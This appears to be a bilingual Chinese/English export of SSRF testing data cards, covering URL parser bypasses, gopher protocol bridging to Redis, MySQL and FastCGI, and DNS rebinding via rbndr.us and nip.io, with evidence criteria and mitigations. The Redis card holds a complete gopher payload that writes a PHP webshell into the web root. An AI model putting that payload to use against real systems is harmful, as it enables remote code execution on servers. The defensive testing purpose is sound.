vulnerability.en: The application fetches user URLs and egress permits link-local metadata; missing platform protections such as IMDSv2 or Metadata-Flavor can expose instance identity. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 在克隆或隔离云实例中只选择对应平台的无敏感实例 ID 路径，使用必需请求头并记录出站连接，不请求凭据正文。 元数据服务日志、出站代理和固定非敏感字段必须共同证明访问；DNS 解析、超时差异或公开文档响应不是证据。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: In a cloned or isolated cloud instance, request only a nonsensitive instance-ID path for the matching platform with required headers and record egress without retrieving credential bodies. Metadata logs, egress proxy records, and a fixed nonsensitive field must jointly prove access; DNS resolution, timeout differences, or public documentation responses are not evidence. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 阻断链路本地出站，使用 URL 允许列表与代理；强制云平台最新元数据保护、最小实例角色，并监控元数据路径请求。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Block link-local egress, use URL allowlists and a proxy, enforce current metadata protections and least-privilege instance roles, and monitor metadata-path requests. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: SSRF URL 解析与地址规范化绕过
name.en: SSRF URL Parsing and Address-Canonicalization Bypass

description.zh: 覆盖非规范 IP、IPv6、userinfo、fragment、Unicode、DNS Rebinding 与通配 DNS，验证 URL 检查和连接目标是否一致。
description.en: Covers non-canonical IPs, IPv6, userinfo, fragments, Unicode, DNS rebinding, and wildcard DNS to test whether URL validation matches the connected destination.

prerequisites.zh: 已锁定生产使用的 URL 校验器、框架解析器、HTTP 客户端和 DNS 解析路径，并可比较各层结果。
prerequisites.en: Identify the production URL validator, framework parser, HTTP client, and DNS path and compare their results.

prerequisites.zh: 受控外部与回环标记服务均可记录唯一令牌，且每次测试只改变一个地址表示或 URL 组件。
prerequisites.en: Controlled external and loopback marker services can log unique tokens, and each test changes only one address representation or URL component.

description.en: Standard payloads

analysis.zh: 阳性要求校验阶段认为目标可达外部，而最终 socket 实际连接受阻地址，并由标记服务证实。字符串包含内网 IP、解析器间输出不同但未连接、DNS 查询、或重定向被拒绝都不构成 SSRF。
analysis.en: Positive evidence requires validation to approve an external target while the final socket reaches a blocked address confirmed by the marker service. An internal-looking string, parser disagreement without a connection, DNS lookup, or a rejected redirect does not constitute SSRF.

opsecTips.zh: 首个解析差异形成受控回环连接后停止，不继续测试真实内网、云元数据或第三方 rebinding 域。
opsecTips.en: Stop after the first parser differential creates a controlled loopback connection; do not continue to real internal networks, cloud metadata, or third-party rebinding domains.

opsecTips.zh: 清除 DNS、代理和 HTTP 连接缓存，关闭标记服务，并删除测试域名与唯一令牌的临时记录。
opsecTips.en: Clear DNS, proxy, and HTTP connection caches, shut down marker services, and delete temporary records for test domains and unique tokens.

title.zh: 确认URL 解析器差异适用边界
title.en: Confirm the URL Parser Differentials boundary

description.zh: 20 行跨多个解析维度，测试时一次只改变地址表示、userinfo、fragment 或 DNS 行为中的一种。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The 20 lines span several parser dimensions; change only one of address notation, userinfo, fragment, or DNS behavior at a time. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控URL 解析器差异样例
title.en: Submit a controlled URL Parser Differentials case

description.zh: 使用与生产相同的解析器离线记录 scheme、host、port 和规范 IP，再向受控回环服务发送单个变体并跟踪重定向与 DNS。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: With the production parser, record scheme, host, port, and canonical IP offline, then send one variant to a controlled loopback service and trace redirects and DNS. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对URL 解析器差异证据

description.zh: 最终 socket 目标与校验阶段地址必须形成可重复差异并有服务日志；字符串包含 127、解析报错或 DNS 查询不构成 SSRF。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: A repeatable difference between the validated address and final socket destination must be supported by service logs; containing 127, parse errors, or DNS lookup alone is insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归URL 解析器差异
title.en: Remediate and regress URL Parser Differentials

description.zh: 单一标准解析器完成规范化，拒绝 userinfo/fragment 混淆与非规范 IP，解析后分类所有地址，并在重定向和每次 DNS 后复检。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Canonicalize with one standard parser, reject userinfo or fragment confusion and non-canonical IPs, classify all resolved addresses, and revalidate after redirects and every DNS lookup. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: SSRF URL 解析与地址规范化绕过用于20 行跨多个解析维度，测试时一次只改变地址表示、userinfo、fragment 或 DNS 行为中的一种。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: SSRF URL Parsing and Address-Canonicalization Bypass is intended for this boundary: The 20 lines span several parser dimensions; change only one of address notation, userinfo, fragment, or DNS behavior at a time. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 安全校验器、框架 URL 类和 HTTP 客户端采用不同解析与规范化规则，导致通过检查的主机最终连接到受阻地址。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A security validator, framework URL class, and HTTP client may parse and canonicalize differently, allowing an approved host string to connect to a blocked address. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 使用与生产相同的解析器离线记录 scheme、host、port 和规范 IP，再向受控回环服务发送单个变体并跟踪重定向与 DNS。 最终 socket 目标与校验阶段地址必须形成可重复差异并有服务日志；字符串包含 127、解析报错或 DNS 查询不构成 SSRF。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: With the production parser, record scheme, host, port, and canonical IP offline, then send one variant to a controlled loopback service and trace redirects and DNS. A repeatable difference between the validated address and final socket destination must be supported by service logs; containing 127, parse errors, or DNS lookup alone is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 单一标准解析器完成规范化，拒绝 userinfo/fragment 混淆与非规范 IP，解析后分类所有地址，并在重定向和每次 DNS 后复检。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Canonicalize with one standard parser, reject userinfo or fragment confusion and non-canonical IPs, classify all resolved addresses, and revalidate after redirects and every DNS lookup. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: Gopher 到 Redis RESP 文件写入序列

description.zh: 使用编码 RESP 命令序列说明 SSRF 获取器如何向 Redis 写键、修改持久化目录并触发保存；仅在隔离协议捕获器中验证字节边界。
description.en: Uses an encoded RESP command sequence to show how an SSRF fetcher could write a Redis key, change persistence paths, and save; validation is limited to an isolated protocol capture service.

subCategory.zh: Gopher Redis RESP 协议桥接

prerequisites.zh: 已在隔离环境确认服务端 URL 获取器支持 gopher 并可连接专用协议捕获器
prerequisites.en: An isolated environment has confirmed gopher support and connectivity to a dedicated protocol capture service.

prerequisites.zh: 不连接真实 Redis，捕获器只记录字节且无命令执行能力
prerequisites.en: No real Redis is contacted; the capture service only records bytes and cannot execute commands.

title.zh: 编码 Redis 持久化序列

description.zh: 原始序列包含破坏性配置/保存和脚本内容，只允许指向字节捕获器。验证时不得发送给 Redis，也不得解码后执行。
description.en: The original sequence contains destructive configuration and save operations plus script content and may point only to a byte capture service. It must never be sent to Redis or executed after decoding.

analysis.zh: 阳性仅定义为应用服务器向捕获器发送解码 RESP 字节。Redis 命令成功、文件写入和 RCE 均未验证；超时、DNS 查询或端口开放是假阳性。
analysis.en: A positive is limited to the application server sending decoded RESP bytes to the capture service. Redis command success, file write, and RCE remain unverified; timeout, DNS lookup, or an open port are false positives.

opsecTips.zh: 取得一次完整字节捕获后立即停止，禁止连接任何真实 Redis。
opsecTips.en: Stop after one complete byte capture and never connect to a real Redis service.

opsecTips.zh: 销毁捕获器日志中的脚本内容，核对隔离网段无 Redis 键、配置或文件变化。
opsecTips.en: Remove script content from capture logs and verify no Redis key, configuration, or file changed in the isolated segment.

title.zh: 离线解析 RESP 序列

description.zh: 核对 URL 解码、命令帧和长度，不向任何网络服务发送。
description.en: Verify URL decoding, command frames, and lengths without sending to any network service.

title.zh: 指向隔离字节捕获器
title.en: Point to an isolated byte capture service

description.zh: 替换地址并提交一次，捕获器不解析或执行 Redis 命令。
description.en: Replace the address and submit once to a service that does not parse or execute Redis commands.

attackChain.payload: gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp system($_GET[%22cmd%22])%3b ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

title.zh: 确认 Redis RESP 字节序列
title.en: Confirm the Redis RESP byte sequence

description.zh: 匹配原始请求、捕获字节、源地址和时间，排除客户端工具发送。
description.en: Match raw request, captured bytes, source address, and time, excluding traffic from the client tool.

title.zh: 停止并验证隔离控制

description.zh: 确认没有连接真实 Redis、没有文件或键变化，并回归协议/内网阻断。
description.en: Confirm that no real Redis was contacted and no key or file changed, then regress scheme and internal-destination blocking.

overview.zh: 该 URI 编码了完整 Redis RESP 序列，跨越 URL 解析、TCP 字节转发、Redis 命令权限和文件持久化多层边界。内容具有破坏性，因此数据卡只用于离线解析和隔离捕获，不用于真实服务验证。
overview.en: This URI encodes a Redis RESP sequence across URL parsing, TCP forwarding, Redis command authorization, and file persistence. Its content is destructive, so the card is for offline parsing and isolated capture only, not live-service validation.

vulnerability.zh: 可利用链要求 URL 获取器允许 gopher、应用网络可达 Redis、Redis 无强认证/ACL、CONFIG/SAVE 可用、文件系统目录可写且可能与 Web 根共享。任一边界阻断都会终止链。
vulnerability.en: The chain requires a gopher-capable fetcher, network reachability to Redis, weak authentication or ACLs, CONFIG and SAVE permission, a writable filesystem, and potentially shared web storage. Blocking any boundary stops the chain.

exploitation.zh: 在离线脚本解码并核对 RESP 长度，然后仅把原 URI 地址改为隔离捕获器，提交一次并匹配完整字节、来源和请求 ID。捕获到字节只确认 SSRF 协议桥接；不得继续验证 Redis 写入或 Web 文件执行。
exploitation.en: Decode offline and verify RESP lengths, then point the original URI only to an isolated capture service, submit once, and match full bytes, source, and request ID. Captured bytes prove SSRF protocol bridging only; do not proceed to Redis writes or web-file execution.

mitigation.zh: URL 获取器只允许 HTTP/HTTPS 并在解析/重定向后阻断内网，网络层隔离 Redis。Redis 启用认证/TLS/ACL，禁用危险命令或限制管理权限，持久化目录不与 Web 服务共享并采用最小文件权限。
mitigation.en: Allow only HTTP or HTTPS in the fetcher, block internal destinations after parsing and redirects, and isolate Redis at the network layer. Enable Redis authentication, TLS, and ACLs, restrict dangerous commands and administration, separate persistence from web storage, and enforce least filesystem privilege.

name.zh: Gopher MySQL 握手片段

description.zh: 使用截断的 MySQL 二进制协议 URI 验证 Gopher SSRF 到 3306 端口的字节转发边界，并明确该样例本身不可执行。
description.en: Uses a truncated MySQL binary-protocol URI to test the byte-forwarding boundary to port 3306 and explicitly documents that the sample is not executable as written.

prerequisites.zh: 隔离获取器已确认支持 gopher，测试端点只是 3306 字节捕获器
prerequisites.en: The isolated fetcher supports gopher and the test endpoint is only a byte capture service on port 3306.

prerequisites.zh: 理解原行中的省略号是不可执行占位，不连接真实 MySQL
prerequisites.en: The ellipsis in the original is understood as a nonexecutable placeholder and no real MySQL is contacted.

title.zh: 截断 MySQL 数据包 URI

description.zh: 该行含 `...`，只能作为协议分类和端口字节转发探针；验证地址改为捕获器，禁止补全认证包或数据库命令。
description.en: The line contains an ellipsis and is only a protocol-classification and port-forwarding probe. Point it to a capture service and do not complete authentication packets or database commands.

analysis.zh: 阳性是应用源向捕获器发送已知前缀；省略号使其无法证明 MySQL 握手、认证或查询。端口开放、DNS、超时和解析错误均是假阳性。
analysis.en: A positive is an application-origin connection sending the known prefix. The ellipsis prevents proof of MySQL handshake, authentication, or query; an open port, DNS, timeout, or parse error is a false positive.

opsecTips.zh: 捕获一次前缀后停止，不补全协议、不连接真实 MySQL。
opsecTips.en: Stop after one prefix capture, do not complete the protocol, and never contact a real MySQL service.

opsecTips.zh: 测试后关闭 3306 捕获器并核对数据库网段无连接或账户事件。
opsecTips.en: Close the port-3306 capture service and verify no connection or account event occurred in the database segment afterward.

title.zh: 确认样例为截断片段

description.zh: 识别省略号与状态化握手，禁止把它描述为可执行 SQL。
description.en: Identify the ellipsis and stateful handshake and do not describe it as executable SQL.

title.zh: 指向 3306 字节捕获器
title.en: Point to a port-3306 byte capture service

description.zh: 替换地址、提交一次并只记录前缀字节和连接来源。
description.en: Replace the address, submit once, and record only prefix bytes and connection source.

title.zh: 确认端口字节转发

description.zh: 匹配应用请求、源地址和捕获前缀，不推断握手或认证成功。
description.en: Match application request, source, and captured prefix without inferring handshake or authentication success.

title.zh: 阻断数据库网段并回归
title.en: Block the database segment and regress

description.zh: 修复后重放正常 HTTP 与该 URI，确认前者可用而 3306 连接被阻断。
description.en: After remediation replay normal HTTP and this URI to preserve the former while blocking port 3306.

overview.zh: MySQL 使用状态化二进制握手，客户端数据依赖服务器挑战和能力协商。原 URI 只有数据包前缀和省略号，不是可直接工作的 MySQL payload；其价值在于标记协议/端口边界。
overview.en: MySQL uses a stateful binary handshake whose client data depends on server challenge and capability negotiation. The URI contains only a packet prefix and ellipsis and is not a working MySQL payload; it marks a protocol and port boundary.

vulnerability.zh: 若获取器允许 gopher 并可达数据库网段，攻击者可能把受控字节发送到 MySQL，但实际认证和查询还受握手、凭据、TLS 与账户权限约束。截断样例不能证明这些后续边界。
vulnerability.en: A gopher-capable fetcher with database-segment reachability may send controlled bytes to MySQL, but authentication and queries still depend on handshake, credentials, TLS, and account privilege. The truncated sample proves none of those downstream boundaries.

exploitation.zh: 只将地址指向隔离捕获器并提交一次，确认应用源连接和 `%a3...` 前缀字节；不连接 MySQL、不补全省略内容。捕获前缀只确认端口字节转发，连接错误或超时不足。
exploitation.en: Point only to an isolated capture service and submit once to confirm an application-origin connection and the percent-a3 prefix bytes. Do not contact MySQL or complete omitted data. The prefix proves port byte forwarding only; connection errors or timeout do not.

mitigation.zh: 获取器协议允许列表限于 HTTP/HTTPS，解析后阻断数据库地址与端口，网络层禁止应用访问 MySQL 管理面。MySQL 使用 TLS、强认证、最小账户权限和独立网段。
mitigation.en: Restrict fetcher schemes to HTTP or HTTPS, block database addresses and ports after resolution, and prevent application access to MySQL management surfaces at the network layer. Use TLS, strong authentication, least privilege, and segmentation for MySQL.

name.zh: Gopher FastCGI 记录片段

description.zh: 使用截断的 FastCGI 记录 URI 验证服务端获取器向 9000 端口发送二进制前缀的能力，并明确不构造可执行参数。
description.en: Uses a truncated Fast CGI record URI to test whether a server fetcher sends a binary prefix to port 9000 without constructing executable parameters.

prerequisites.zh: 隔离环境提供只记录字节的 9000 端口捕获器
prerequisites.en: The isolated environment provides a byte-only capture service on port 9000.

prerequisites.zh: 不连接 php-fpm/FastCGI，也不补全参数或脚本文件名
prerequisites.en: No php-fpm or Fast CGI service is contacted and no parameters or script filename are completed.

title.zh: 截断 FastCGI 记录 URI

description.zh: 省略号表示记录不完整。只替换为隔离捕获器并验证固定头字节，不生成 FCGI_PARAMS/STDIN 或 PHP 脚本请求。
description.en: The ellipsis marks an incomplete record. Point only to an isolated capture service and verify header bytes; do not generate FCGI_PARAMS, STDIN, or a PHP script request.

analysis.zh: 阳性仅为应用服务器向捕获器发送 FastCGI 头前缀。截断内容无法证明有效请求、PHP 文件选择或执行；开放端口和超时是假阳性。
analysis.en: A positive is limited to the application server sending a Fast CGI header prefix to the capture service. Truncated content cannot prove a valid request, PHP file selection, or execution; an open port and timeout are false positives.

opsecTips.zh: 取得一次头字节后停止，禁止补全参数、请求 PHP 文件或访问真实 FPM。
opsecTips.en: Stop after one header-byte capture and never complete parameters, request a PHP file, or access real FPM.

opsecTips.zh: 测试后关闭捕获器并核对 FPM 日志没有请求、子进程或文件访问。
opsecTips.en: Close the capture service and verify FPM logs contain no request, child process, or file access afterward.

title.zh: 标记截断 FastCGI 前提
title.en: Document the truncated Fast CGI prerequisite

description.zh: 确认片段缺少参数和内容记录，不能描述为 PHP 执行 payload。
description.en: Confirm the fragment lacks parameter and content records and cannot be described as a PHP execution payload.

title.zh: 提交到隔离 9000 捕获器
title.en: Submit to an isolated port-9000 capture service

description.zh: 替换地址并发送一次，只采集前缀、来源和请求 ID。
description.en: Replace the address and send once, collecting only prefix, source, and request ID.

title.zh: 确认应用源记录前缀

description.zh: 匹配捕获字节与请求，不推断 SCRIPT_FILENAME、FPM 处理或代码执行。
description.en: Match captured bytes and request without inferring SCRIPT_FILENAME, FPM handling, or code execution.

title.zh: 隔离 FPM 并回归

description.zh: 修复协议/网络边界后重放，确认正常 URL 获取保留且 9000 无连接。
description.en: After scheme and network fixes replay to preserve normal retrieval while no port-9000 connection occurs.

overview.zh: FastCGI 是带记录头、请求 ID、参数流和标准输入的二进制协议。原行只有 BEGIN_REQUEST 类前缀和省略号，不能执行 PHP；安全用途是确认 gopher 到 9000 的原始字节边界。
overview.en: Fast CGI is a binary record protocol with headers, request I Ds, parameters, and standard input. The line contains only a BEGIN_REQUEST-like prefix and ellipsis and cannot execute PHP; its safe use is confirming raw byte delivery to port 9000.

vulnerability.zh: 若获取器允许 gopher 且能访问 php-fpm，完整构造可能跨越反向代理预期边界。但还需要有效记录、SCRIPT_FILENAME、文件存在和 FPM 配置，截断片段不证明这些条件。
vulnerability.en: If a gopher-capable fetcher can reach php-fpm, a complete construction could cross an intended proxy boundary. It still requires valid records, SCRIPT_FILENAME, an existing file, and compatible FPM configuration, none of which the fragment proves.

exploitation.zh: 地址仅改为 9000 字节捕获器，提交一次并匹配 `%01%01%00%01` 解码前缀与应用来源。不得补全 FastCGI 参数或连接真实 FPM。连接失败、端口开放或错误页面不算字节转发。
exploitation.en: Point only to a port-9000 byte capture service, submit once, and match the decoded prefix and application source. Do not complete Fast CGI parameters or contact real FPM. Connection failure, an open port, or an error page does not prove byte forwarding.

mitigation.zh: 获取器限制协议和解析后目标，网络层禁止应用访问 FPM 监听端口；php-fpm 仅绑定 Unix Socket 或受限接口，使用最小权限、明确 SCRIPT_FILENAME 根并禁用不需要功能。
mitigation.en: Restrict fetcher schemes and resolved destinations, block application access to FPM ports, bind php-fpm to a Unix socket or restricted interface, use least privilege, enforce a script root, and disable unnecessary features.

name.zh: rbndr.us DNS Rebinding 地址切换

description.zh: 使用 rbndr.us 双地址域名在回环、链路本地与私网地址间切换，验证 DNS 校验和连接阶段是否分离。
description.en: Uses rbndr.us dual-address hostnames that alternate among loopback, link-local, and private addresses to test separation between DNS validation and connection.

subCategory.zh: 公共 Rebinding 域名探测

prerequisites.zh: 第三方 rbndr.us 当前解析行为、TTL 和返回地址顺序已在隔离解析器中确认。
prerequisites.en: Confirm current rbndr.us resolution behavior, TTL, and address order in an isolated resolver.

prerequisites.zh: 外部与回环两端均为受控标记服务，且 HTTP 客户端的 DNS 缓存/重试行为可观测。
prerequisites.en: Both external and loopback endpoints are controlled marker services, and HTTP-client DNS caching and retries are observable.

title.zh: rbndr.us 技术
title.en: Validation step 1 for rbndr.us DNS Rebinding Address Switching

description.zh: rbndr.us 技术包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this rbndr.us DNS Rebinding Address Switching validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性需权威/递归 DNS 日志显示校验与连接使用了不同答案，并由内部标记服务收到同一令牌。域名能解析两个 IP、TTL 很低、首答为外部或第三方服务偶发失败都不代表 rebinding 成功。
analysis.en: Positive evidence requires DNS logs showing different answers at validation and connection and the internal marker receiving the same token. Resolving two IPs, a low TTL, an external first answer, or third-party instability does not prove rebinding.

opsecTips.zh: 一旦受控回环端收到令牌就停止，不把域名对替换为云元数据或真实私网地址。
opsecTips.en: Stop once the controlled loopback endpoint receives the token; do not replace address pairs with cloud metadata or real private hosts.

opsecTips.zh: 清除解析器/客户端缓存，关闭两个标记服务，并从测试记录中删除第三方域名令牌和内部地址。
opsecTips.en: Clear resolver and client caches, shut down both marker services, and remove third-party domain tokens and internal addresses from test records.

title.zh: 确认公共 Rebinding 域名探测适用边界
title.en: Confirm the Public Rebinding-Domain Probing boundary

description.zh: 每个域名编码一对候选地址，行为依赖第三方 DNS 当前服务与缓存；只应在隔离环境和受控目标上验证。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Each hostname encodes two candidate addresses and depends on current third-party DNS and caching behavior; validate only in isolation against controlled targets. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控公共 Rebinding 域名探测样例
title.en: Submit a controlled Public Rebinding-Domain Probing case

description.zh: 记录连续 DNS 查询、TTL 和所有 A/AAAA 结果，再让服务端请求一个受控回环标记端口；不访问元数据或真实内网服务。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Record consecutive DNS responses, TTLs, and all A/AAAA answers, then request a controlled loopback marker port without touching metadata or real internal services. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对公共 Rebinding 域名探测证据

description.zh: 必须证明校验阶段和连接阶段解析结果不同，且受控服务收到请求；第三方 DNS 不可用、单次解析或 URL 回显不成立。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Prove that validation and connection resolved differently and that the controlled service received the request; third-party DNS failure, one lookup, or URL reflection is insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归公共 Rebinding 域名探测
title.en: Remediate and regress Public Rebinding-Domain Probing

description.zh: 校验并固定解析后的允许地址，连接时使用固定 IP 与正确 Host/SNI；重定向和重解析均重新执行地址分类，并限制出站。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Validate and pin allowed resolved addresses, connect to the pinned IP with correct Host and SNI, reclassify on redirects and re-resolution, and restrict egress. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: rbndr.us DNS Rebinding 地址切换用于每个域名编码一对候选地址，行为依赖第三方 DNS 当前服务与缓存；只应在隔离环境和受控目标上验证。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: rbndr.us DNS Rebinding Address Switching is intended for this boundary: Each hostname encodes two candidate addresses and depends on current third-party DNS and caching behavior; validate only in isolation against controlled targets. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 应用只校验首次 DNS 结果或缓存主机字符串，后续解析可能返回受阻地址，形成检查时与使用时差异。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The application validates only the first DNS result or caches the host string, while later resolution may return a blocked address and create a time-of-check/time-of-use gap. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 记录连续 DNS 查询、TTL 和所有 A/AAAA 结果，再让服务端请求一个受控回环标记端口；不访问元数据或真实内网服务。 必须证明校验阶段和连接阶段解析结果不同，且受控服务收到请求；第三方 DNS 不可用、单次解析或 URL 回显不成立。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Record consecutive DNS responses, TTLs, and all A/AAAA answers, then request a controlled loopback marker port without touching metadata or real internal services. Prove that validation and connection resolved differently and that the controlled service received the request; third-party DNS failure, one lookup, or URL reflection is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 校验并固定解析后的允许地址，连接时使用固定 IP 与正确 Host/SNI；重定向和重解析均重新执行地址分类，并限制出站。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Validate and pin allowed resolved addresses, connect to the pinned IP with correct Host and SNI, reclassify on redirects and re-resolution, and restrict egress. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: nip.io 通配 DNS SSRF 目标

description.zh: 使用把 IPv4 嵌入主机名的 nip.io 域名指向回环、链路本地和私网服务，测试主机名允许列表缺口。
description.en: Uses nip.io hostnames embedding IPv4 addresses to resolve to loopback, link-local, and private services and test hostname-allowlist gaps.

subCategory.zh: nip.io 通配 DNS 解析

prerequisites.zh: 已从 nip.io 官方实现和实时 DNS 查询确认嵌入 IPv4 的主机名当前解析规则。
prerequisites.en: Confirm current embedded-IPv4 hostname resolution from the nip.io implementation and live DNS queries.

prerequisites.zh: 选择一个解析到受控回环服务的 URL，并能记录 A/AAAA、TTL、最终连接 IP 与请求令牌。
prerequisites.en: Choose one URL resolving to a controlled loopback service and record A or AAAA answers, TTL, final IP, and request token.

title.zh: nip.io 通配符DNS
title.en: Validation step 1 for nip.io Wildcard-DNS SSRF Targets

description.zh: nip.io 通配符DNS包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this nip.io Wildcard-DNS SSRF Targets validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性是主机字符串绕过表面规则后，应用最终连接 nip.io 解析出的内网/回环标记服务。只获得 A 记录、访问 nip.io 公共页面、连接被防火墙拒绝或浏览器发起请求都是假阳性。
analysis.en: Positive evidence is the application connecting to the internal or loopback marker resolved through nip.io after bypassing a superficial host rule. An A record alone, the nip.io landing page, firewall rejection, or a browser-originated request is false positive.

opsecTips.zh: 一个 nip.io 主机成功到达标记端口后停止，不遍历数据库、Kubernetes 或元数据端口列表。
opsecTips.en: Stop after one nip.io host reaches the marker port; do not enumerate database, Kubernetes, or metadata ports.

opsecTips.zh: 关闭标记服务并清理 DNS/HTTP 缓存，删除访问日志中的完整内网 URL 和令牌。
opsecTips.en: Shut down the marker service, clear DNS and HTTP caches, and remove full internal URLs and tokens from access logs.

title.zh: 确认nip.io 通配 DNS 解析适用边界
title.en: Confirm the nip.io Wildcard-DNS Resolution boundary

description.zh: 这些 URL 利用看似域名的主机解析为内网 IP；必须先确认 nip.io 当前解析结果并只测试一个受控服务。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: These URLs use domain-looking hosts that resolve to internal IPs; confirm current nip.io resolution and test only one controlled service. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控nip.io 通配 DNS 解析样例
title.en: Submit a controlled nip.io Wildcard-DNS Resolution case

description.zh: 离线查询 A/AAAA 和 TTL，记录嵌入地址与实际结果，再由应用请求一个固定标记路径并捕获最终连接 IP。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Query A/AAAA and TTL offline, compare embedded and actual addresses, then have the application request one fixed marker path and capture the final IP. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对nip.io 通配 DNS 解析证据

description.zh: 受控内网服务日志和 HTTP 客户端连接地址必须一致；DNS 成功、HTTP 状态差异或第三方首页都不能证明 SSRF。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Controlled internal-service logs and the HTTP client's connected address must agree; DNS success, status differences, or a third-party landing page do not prove SSRF. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归nip.io 通配 DNS 解析
title.en: Remediate and regress nip.io Wildcard-DNS Resolution

description.zh: 对解析后的所有地址执行网段阻断，避免基于字符串后缀允许 URL，并在每次重定向和 DNS 刷新后重新校验。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Block disallowed ranges across all resolved addresses, avoid string-suffix URL approval, and revalidate after each redirect and DNS refresh. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: nip.io 通配 DNS SSRF 目标用于这些 URL 利用看似域名的主机解析为内网 IP；必须先确认 nip.io 当前解析结果并只测试一个受控服务。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: nip.io Wildcard-DNS SSRF Targets is intended for this boundary: These URLs use domain-looking hosts that resolve to internal IPs; confirm current nip.io resolution and test only one controlled service. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 校验只检查主机字符串后缀或拒绝 IP 字面量，却未解析并分类 DNS 结果，通配 DNS 因此绕过表面规则。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: Validation checks a hostname suffix or rejects IP literals without resolving and classifying DNS answers, allowing wildcard DNS to bypass superficial rules. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

